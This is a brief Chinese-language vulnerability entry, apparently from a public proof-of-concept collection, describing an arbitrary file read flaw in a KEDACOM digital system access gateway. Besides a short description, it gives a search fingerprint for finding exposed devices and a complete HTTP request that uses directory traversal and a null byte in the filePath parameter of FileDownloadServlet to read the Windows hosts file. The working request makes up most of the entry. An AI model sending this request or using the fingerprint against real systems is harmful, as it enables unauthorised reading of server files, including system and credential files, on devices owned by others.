# KEDACOM数字系统接入网关 任意文件读取漏洞

# 一、漏洞简介
KEDACOM 数字系统接入网关 存在任意文件读取漏洞，攻击者通过构造请求可以读取服务器任意文件

# 二、影响版本
+ KEDACOM 数字系统接入网关

# 三、资产测绘
+ hunter`web.body="/**起始端口变量*/"`
+ 特征


# 四、漏洞复现
```plain
GET /gatewayweb/FileDownloadServlet?fileName=test.txt&filePath=../../../../../../../../../../Windows/System32/drivers/etc/hosts%00.jpg&type=2 HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: JSESSIONID=FAEECB621961790CDFC5AB87BBEB1E20; JSESSIONID=760C78AEAACEFF5C9110E58901A9AAC3
Upgrade-Insecure-Requests: 1
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/agh61crlxr5redq2>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
